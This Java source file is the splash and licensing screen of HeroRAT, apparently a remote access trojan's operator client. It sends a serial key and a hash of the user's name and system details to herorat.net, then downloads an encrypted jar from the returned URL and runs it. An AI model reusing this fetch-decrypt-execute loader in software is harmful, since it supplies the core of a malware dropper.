package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.concurrent.Executors;

import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

import net.herorat.loader.EcryptedWrapper;
import net.herorat.utils.Crypto;


public class FrameSplash extends JFrame
{
	private static final long serialVersionUID = 4030263650497001394L;
	
	private JPanel panel_splash;
	private JLabel label_splash;
	
	private JPanel panel_bottom;
	
	private JPanel panel_loading;
	public static JLabel label_loading;

	public FrameSplash()
	{	
		initComponents();
		display();
		centerWindow();
		startTimer();
	}
	
	private void initComponents()
	{
		setPreferredSize(new Dimension(800, 330));
		setIconImage(new ImageIcon(getClass().getResource("/images/icon.png")).getImage());
		createImage();
		createPanel();
		setUndecorated(true);
	}
	
	private void display()
	{
		pack();
		setVisible(true);
	}
	
	private void createImage()
	{
		panel_splash = new JPanel();
		label_splash = new JLabel(new ImageIcon(getClass().getResource("/images/logo_big.png")));
		panel_splash.setLayout(new BorderLayout(5, 0));
		panel_splash.setBackground(new Color(51, 51, 51));
		panel_splash.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 0));
		panel_splash.add(label_splash);
		getContentPane().add(panel_splash, BorderLayout.NORTH);
	}
	
	private void createPanel()
	{
		panel_bottom = new JPanel();
		panel_bottom.setBackground(new Color(51, 51, 51));
		
		panel_loading = new JPanel();
		panel_loading.setBackground(new Color(51, 51, 51));
		label_loading = new JLabel("All rights reserved 2012 ©");
		label_loading.setForeground(Color.LIGHT_GRAY);
		panel_loading.add(label_loading);
		
		panel_bottom.add(panel_loading, BorderLayout.CENTER);
		
		getContentPane().add(panel_bottom, BorderLayout.CENTER);
	}
	
	private void centerWindow()
	{
		int bounds_top = Toolkit.getDefaultToolkit().getScreenSize().height / 2;
		int bounds_left = Toolkit.getDefaultToolkit().getScreenSize().width / 2;
		int half_height = this.getSize().height / 2;
		int half_width = this.getSize().width / 2;
		this.setLocation(bounds_left - half_width, bounds_top - half_height);
	}
	
	private void startTimer()
	{
		try
		{
			Thread.sleep(3000);
		}
		catch (Exception e) {}
		
		label_loading.setText("Waiting for user input ...");
		
		String serial_key = JOptionPane.showInputDialog(null, "Enter your serial key: ", "HeroRAT - Remote Administration Tool", 1);
		if (serial_key == null || !serial_key.matches("^(\\d{4}\\-){3}\\d{4}$"))
		{
			JOptionPane.showMessageDialog(null, "The serial number doesn't seem to be valid.\nPlease try again. If the problem continues, visit www.herorat.net to check for guidance.", "Error", JOptionPane.ERROR_MESSAGE);
			System.exit(1);
		}
		
		label_loading.setText("Loading ...");
		download(serial_key);
	}
	
	private void download(String serial)
	{
		try
		{
			URL loginUrl = new URL("http://herorat.net/login/login.php");
			
			String data = URLEncoder.encode("key", "UTF-8") + "=" + URLEncoder.encode(serial, "UTF-8");
			data += "&" + URLEncoder.encode("hwid", "UTF-8") + "=" + URLEncoder.encode(getHwid(), "UTF-8");
			
			URLConnection connection = loginUrl.openConnection();
			connection.setDoOutput(true);
			OutputStreamWriter wr = new OutputStreamWriter(connection.getOutputStream());
			wr.write(data);
			wr.flush();

			BufferedReader rd = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			String jarUrl = new String(Crypto.decrypt(Crypto.hexToByte(rd.readLine())));
			String expiration_date = rd.readLine();
			wr.close();
			rd.close();
			
			// Start download
			if (jarUrl != null && expiration_date != null)
			{
				Executors.newCachedThreadPool();
				EcryptedWrapper wrapper = new EcryptedWrapper(jarUrl, serial, expiration_date);
				wrapper.load();
				wrapper.run();
				this.setVisible(false);
				return;
			}
		}
		catch (FileNotFoundException e)
		{
			JOptionPane.showMessageDialog(null, "Are you trying to hack this software?.\nIf no, visit www.herorat.net to check for guidance.", "Error", JOptionPane.ERROR_MESSAGE);
			System.exit(1);
		}
		catch (Exception e) {e.printStackTrace();}
		
		JOptionPane.showMessageDialog(null, "An error occured loading the client.\nPlease check your Internet connection or retry later.\nIf the problem continues, visit www.herorat.net to check for guidance.", "Error", JOptionPane.ERROR_MESSAGE);
		System.exit(1);
	}
	
	public static String getHwid()
	{
		String data = System.getProperty("user.country") + "###";
		data += System.getProperty("user.name")	+ "###";
		data += System.getProperty("os.name") + "###";
		data += System.getProperty("os.arch");
		
		return Crypto.md5(data);
	}
}
